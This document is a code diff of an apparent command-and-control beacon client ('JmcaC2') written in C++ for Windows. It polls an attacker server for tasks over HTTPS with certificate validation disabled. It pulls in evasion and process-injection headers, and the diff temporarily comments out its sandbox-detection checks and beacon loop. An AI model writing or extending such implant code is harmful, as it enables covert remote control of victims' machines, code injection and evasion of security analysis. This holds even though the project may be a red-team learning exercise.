@@ -4,14 +4,8 @@
 // Compile: g++ .\main.cpp -lwinhttp -lws2_32 -o beacon-client.exe
 // Compile: cl  main.cpp /link ws2_32.lib winhttp.lib user32.lib;
 
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
-#endif
-
 #include "evasion.h"
 #include "procInjection.h"
-
-#pragma comment(lib, "User32.lib")
 
 using std::string;
 
@@ -23,6 +17,11 @@ int CreateTCPConn();
 bool sendHTTPTaskResult();
 
 static std::wstring beaconName = L"";
+
+bool PrintWinHttpError(const char* msg) {
+    std::cout << msg << " failed: " << GetLastError() << "\n";
+    return false;
+}
 
 bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     // WinHTTP > WinINet
@@ -36,26 +35,33 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
     HINTERNET hHTTPSession = {}, hHTTPConnection = {}, hHTTPRequest = {};
     bool isRequestSuccessful{}, didReceiveResponse{};
 
-    hHTTPSession =
-        WinHttpOpen(L"JmcaC2 Task Fetching",
-                    WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME,
-                    WINHTTP_NO_PROXY_BYPASS, 0);  // SYNCHRONOUS (blocking)
+    // SYNCHRONOUS (blocking)
 
-    if (hHTTPSession)
-        hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
-                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!(hHTTPSession = WinHttpOpen(
+              L"JmcaC2 Task Fetching", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)))
+        return PrintWinHttpError("WinHttpOpen");
+
+    if (!(hHTTPConnection = WinHttpConnect(hHTTPSession, HTTP_SERVER_IP,
+                                           (INTERNET_PORT)HTTP_SERVER_PORT, 0)))
+        return PrintWinHttpError("WinHttpOpen");
+
+    if (!(hHTTPRequest = WinHttpOpenRequest(
+              hHTTPConnection, L"GET", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
+              ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE))) {
+        return PrintWinHttpError("WinHttpOpenRequest");
+    }
+
+    std::cout << "Request Sent" << std::endl;
 
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
 
-                  WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS,
-                                   &flags, sizeof(flags));
-    if (hHTTPConnection)
-        // Send Request
-        hHTTPRequest = WinHttpOpenRequest(
-            hHTTPConnection, L"GET", RESOURCE_NAME, NULL, WINHTTP_NO_REFERER,
-            ACCEPTED_MIME_TYPES, WINHTTP_FLAG_SECURE);
+    if (!WinHttpSetOption(hHTTPRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags,
+                          sizeof(flags))) {
+        PrintWinHttpError("WinHttpSetOption");
+    }
 
     std::wstring headerString;
     LPCWSTR headerPtr = WINHTTP_NO_ADDITIONAL_HEADERS;
@@ -65,16 +71,17 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
         headerPtr = headerString.c_str();
     }
 
-    if (hHTTPRequest)
-        isRequestSuccessful = WinHttpSendRequest(
-            hHTTPRequest, headerPtr, (DWORD)-1, WINHTTP_NO_REQUEST_DATA, 0, 0,
-            0);  // WINHTTP_NO_REQUEST_DATA
     // should be replaced if POST
+    if (!(isRequestSuccessful =
+              WinHttpSendRequest(hHTTPRequest, headerPtr, (DWORD)-1,
+                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0)))
+        return PrintWinHttpError("WinHttpSendRequest");
 
-    didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL);
+    if (!(didReceiveResponse = WinHttpReceiveResponse(hHTTPRequest, NULL)))
+        return PrintWinHttpError("WinHttpReceiveResponse");
 
     // extract the beacon name from the response
-    if (beaconName.empty() && didReceiveResponse) {
+    if (beaconName.empty()) {
         DWORD size = 0;
         WinHttpQueryHeaders(hHTTPRequest, WINHTTP_QUERY_CUSTOM, L"BeaconName",
                             WINHTTP_NO_OUTPUT_BUFFER, &size,
@@ -108,6 +115,7 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
             delete[] responseBuf;
             break;
         }
+
         // append chunk to output
         char* newBuf = new char[*dwSizeOut + dwOut];
         if (*outBuffer != nullptr) {
@@ -139,35 +147,35 @@ void fetchServerCertificate(HINTERNET hConnection) {}
 
 int main(int argc, const char** argv) {
     // Run all checks
-    BOOL cpuOK = checkCPU();
-    BOOL ramOK = checkRAM();
-    BOOL hddOK = checkHDD();
-    BOOL processesOK = checkProcesses();
+    // BOOL cpuOK = checkCPU();
+    // BOOL ramOK = checkRAM();
+    // BOOL hddOK = checkHDD();
+    // BOOL processesOK = checkProcesses();
 
     // Check if all tests passed
-    if (!cpuOK || !ramOK || !hddOK || !processesOK) {
-        return 0;
-    }
+    // if (!cpuOK || !ramOK || !hddOK || !processesOK) {
+    //     return 0;
+    // }
 
     char* outBuffer = nullptr;
     DWORD dwSize = 0;
 
-    while (true) {
-        if (fetchTasks(&outBuffer, &dwSize)) {
-            // TODO: parse tasks and do
-            if (dwSize > 0) {
-                printf("TASK: %.*s\n", dwSize, outBuffer);
-                delete[] outBuffer;
-                dwSize = 0;
-            }
-            // processInject();
-            // runPSCommand(argv[1]);
-            //  TODO: post results
+    // while (true) {
+    if (fetchTasks(&outBuffer, &dwSize)) {
+        // TODO: parse tasks and do
+        if (dwSize > 0) {
+            printf("TASK: %.*s\n", dwSize, outBuffer);
+            delete[] outBuffer;
+            dwSize = 0;
         }
-
-        // TODO: jitter sleep interval
-        Sleep(5000);
+        // processInject();
+        // runPSCommand(argv[1]);
+        //  TODO: post results
     }
+
+    // TODO: jitter sleep interval
+    Sleep(5000);
+    // }
 
     return 0;
 }
